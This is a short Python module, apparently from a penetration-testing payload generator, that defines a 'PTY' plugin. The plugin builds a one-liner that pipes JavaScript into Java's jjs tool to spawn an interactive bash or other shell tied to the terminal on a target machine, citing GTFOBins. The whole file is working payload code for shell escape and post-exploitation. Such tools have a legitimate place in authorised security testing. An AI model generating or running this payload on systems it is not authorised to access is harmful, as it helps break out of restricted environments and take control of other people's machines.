from ogabog.cores import plugin, const


class PTY(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.opts.description = "[Interactive][SystemShell] https://gtfobins.github.io/gtfobins/jjs/"
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
        self.shell_type = "pty"

    def make_shell(self):
        self.shell = f"echo \"Java.type('java.lang.Runtime').getRuntime().exec('{self.args.shell}"
        self.shell += f" -c \\$@|sh _ echo {self.args.shell} <$(tty) >$(tty) 2>$(tty)').waitFor()\" | jjs"
